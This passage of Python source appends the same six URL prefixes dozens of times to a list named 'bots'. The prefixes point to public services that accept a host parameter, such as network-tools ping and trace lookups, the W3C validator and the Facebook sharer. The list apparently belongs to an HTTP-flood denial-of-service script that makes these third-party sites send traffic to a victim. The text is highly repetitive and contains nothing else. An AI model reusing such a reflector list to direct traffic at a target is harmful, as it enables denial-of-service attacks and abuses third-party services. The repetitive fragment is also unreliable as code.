	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
